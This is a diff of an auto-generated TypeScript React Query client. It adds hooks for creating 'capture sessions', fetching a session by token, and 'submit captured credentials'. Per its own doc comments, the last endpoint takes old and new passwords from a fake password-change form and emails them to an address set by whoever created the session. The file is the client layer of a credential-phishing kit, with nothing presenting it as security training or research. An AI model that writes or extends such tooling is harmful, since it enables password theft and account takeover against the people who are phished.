@@ -5,18 +5,29 @@
  * API specification
  * OpenAPI spec version: 0.1.0
  */
-import { useQuery } from "@tanstack/react-query";
+import { useMutation, useQuery } from "@tanstack/react-query";
 import type {
+  MutationFunction,
   QueryFunction,
   QueryKey,
+  UseMutationOptions,
+  UseMutationResult,
   UseQueryOptions,
   UseQueryResult,
 } from "@tanstack/react-query";
 
-import type { HealthStatus } from "./api.schemas";
+import type {
+  CreateSessionBody,
+  ErrorResponse,
+  HealthStatus,
+  Session,
+  SessionPublic,
+  SubmitCaptureBody,
+  SubmitResult,
+} from "./api.schemas";
 
 import { customFetch } from "../custom-fetch";
-import type { ErrorType } from "../custom-fetch";
+import type { ErrorType, BodyType } from "../custom-fetch";
 
 type AwaitedInput<T> = PromiseLike<T> | T;
 
@@ -99,3 +110,266 @@ export function useHealthCheck<
 
   return { ...query, queryKey: queryOptions.queryKey };
 }
+
+/**
+ * Registers a new session with sender credentials and result email. Returns a unique token for the capture link.
+ * @summary Create a capture session
+ */
+export const getCreateSessionUrl = () => {
+  return `/api/sessions`;
+};
+
+export const createSession = async (
+  createSessionBody: CreateSessionBody,
+  options?: RequestInit,
+): Promise<Session> => {
+  return customFetch<Session>(getCreateSessionUrl(), {
+    ...options,
+    method: "POST",
+    headers: { "Content-Type": "application/json", ...options?.headers },
+    body: JSON.stringify(createSessionBody),
+  });
+};
+
+export const getCreateSessionMutationOptions = <
+  TError = ErrorType<ErrorResponse>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof createSession>>,
+    TError,
+    { data: BodyType<CreateSessionBody> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationOptions<
+  Awaited<ReturnType<typeof createSession>>,
+  TError,
+  { data: BodyType<CreateSessionBody> },
+  TContext
+> => {
+  const mutationKey = ["createSession"];
+  const { mutation: mutationOptions, request: requestOptions } = options
+    ? options.mutation &&
+      "mutationKey" in options.mutation &&
+      options.mutation.mutationKey
+      ? options
+      : { ...options, mutation: { ...options.mutation, mutationKey } }
+    : { mutation: { mutationKey }, request: undefined };
+
+  const mutationFn: MutationFunction<
+    Awaited<ReturnType<typeof createSession>>,
+    { data: BodyType<CreateSessionBody> }
+  > = (props) => {
+    const { data } = props ?? {};
+
+    return createSession(data, requestOptions);
+  };
+
+  return { mutationFn, ...mutationOptions };
+};
+
+export type CreateSessionMutationResult = NonNullable<
+  Awaited<ReturnType<typeof createSession>>
+>;
+export type CreateSessionMutationBody = BodyType<CreateSessionBody>;
+export type CreateSessionMutationError = ErrorType<ErrorResponse>;
+
+/**
+ * @summary Create a capture session
+ */
+export const useCreateSession = <
+  TError = ErrorType<ErrorResponse>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof createSession>>,
+    TError,
+    { data: BodyType<CreateSessionBody> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationResult<
+  Awaited<ReturnType<typeof createSession>>,
+  TError,
+  { data: BodyType<CreateSessionBody> },
+  TContext
+> => {
+  return useMutation(getCreateSessionMutationOptions(options));
+};
+
+/**
+ * Returns basic session info (existence check). Does not expose credentials.
+ * @summary Get session info by token
+ */
+export const getGetSessionUrl = (token: string) => {
+  return `/api/sessions/${token}`;
+};
+
+export const getSession = async (
+  token: string,
+  options?: RequestInit,
+): Promise<SessionPublic> => {
+  return customFetch<SessionPublic>(getGetSessionUrl(token), {
+    ...options,
+    method: "GET",
+  });
+};
+
+export const getGetSessionQueryKey = (token: string) => {
+  return [`/api/sessions/${token}`] as const;
+};
+
+export const getGetSessionQueryOptions = <
+  TData = Awaited<ReturnType<typeof getSession>>,
+  TError = ErrorType<ErrorResponse>,
+>(
+  token: string,
+  options?: {
+    query?: UseQueryOptions<
+      Awaited<ReturnType<typeof getSession>>,
+      TError,
+      TData
+    >;
+    request?: SecondParameter<typeof customFetch>;
+  },
+) => {
+  const { query: queryOptions, request: requestOptions } = options ?? {};
+
+  const queryKey = queryOptions?.queryKey ?? getGetSessionQueryKey(token);
+
+  const queryFn: QueryFunction<Awaited<ReturnType<typeof getSession>>> = ({
+    signal,
+  }) => getSession(token, { signal, ...requestOptions });
+
+  return {
+    queryKey,
+    queryFn,
+    enabled: !!token,
+    ...queryOptions,
+  } as UseQueryOptions<
+    Awaited<ReturnType<typeof getSession>>,
+    TError,
+    TData
+  > & { queryKey: QueryKey };
+};
+
+export type GetSessionQueryResult = NonNullable<
+  Awaited<ReturnType<typeof getSession>>
+>;
+export type GetSessionQueryError = ErrorType<ErrorResponse>;
+
+/**
+ * @summary Get session info by token
+ */
+
+export function useGetSession<
+  TData = Awaited<ReturnType<typeof getSession>>,
+  TError = ErrorType<ErrorResponse>,
+>(
+  token: string,
+  options?: {
+    query?: UseQueryOptions<
+      Awaited<ReturnType<typeof getSession>>,
+      TError,
+      TData
+    >;
+    request?: SecondParameter<typeof customFetch>;
+  },
+): UseQueryResult<TData, TError> & { queryKey: QueryKey } {
+  const queryOptions = getGetSessionQueryOptions(token, options);
+
+  const query = useQuery(queryOptions) as UseQueryResult<TData, TError> & {
+    queryKey: QueryKey;
+  };
+
+  return { ...query, queryKey: queryOptions.queryKey };
+}
+
+/**
+ * Receives old/new password from the capture form and sends them via email to the result email address.
+ * @summary Submit captured credentials
+ */
+export const getSubmitCaptureUrl = (token: string) => {
+  return `/api/sessions/${token}/submit`;
+};
+
+export const submitCapture = async (
+  token: string,
+  submitCaptureBody: SubmitCaptureBody,
+  options?: RequestInit,
+): Promise<SubmitResult> => {
+  return customFetch<SubmitResult>(getSubmitCaptureUrl(token), {
+    ...options,
+    method: "POST",
+    headers: { "Content-Type": "application/json", ...options?.headers },
+    body: JSON.stringify(submitCaptureBody),
+  });
+};
+
+export const getSubmitCaptureMutationOptions = <
+  TError = ErrorType<ErrorResponse>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof submitCapture>>,
+    TError,
+    { token: string; data: BodyType<SubmitCaptureBody> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationOptions<
+  Awaited<ReturnType<typeof submitCapture>>,
+  TError,
+  { token: string; data: BodyType<SubmitCaptureBody> },
+  TContext
+> => {
+  const mutationKey = ["submitCapture"];
+  const { mutation: mutationOptions, request: requestOptions } = options
+    ? options.mutation &&
+      "mutationKey" in options.mutation &&
+      options.mutation.mutationKey
+      ? options
+      : { ...options, mutation: { ...options.mutation, mutationKey } }
+    : { mutation: { mutationKey }, request: undefined };
+
+  const mutationFn: MutationFunction<
+    Awaited<ReturnType<typeof submitCapture>>,
+    { token: string; data: BodyType<SubmitCaptureBody> }
+  > = (props) => {
+    const { token, data } = props ?? {};
+
+    return submitCapture(token, data, requestOptions);
+  };
+
+  return { mutationFn, ...mutationOptions };
+};
+
+export type SubmitCaptureMutationResult = NonNullable<
+  Awaited<ReturnType<typeof submitCapture>>
+>;
+export type SubmitCaptureMutationBody = BodyType<SubmitCaptureBody>;
+export type SubmitCaptureMutationError = ErrorType<ErrorResponse>;
+
+/**
+ * @summary Submit captured credentials
+ */
+export const useSubmitCapture = <
+  TError = ErrorType<ErrorResponse>,
+  TContext = unknown,
+>(options?: {
+  mutation?: UseMutationOptions<
+    Awaited<ReturnType<typeof submitCapture>>,
+    TError,
+    { token: string; data: BodyType<SubmitCaptureBody> },
+    TContext
+  >;
+  request?: SecondParameter<typeof customFetch>;
+}): UseMutationResult<
+  Awaited<ReturnType<typeof submitCapture>>,
+  TError,
+  { token: string; data: BodyType<SubmitCaptureBody> },
+  TContext
+> => {
+  return useMutation(getSubmitCaptureMutationOptions(options));
+};
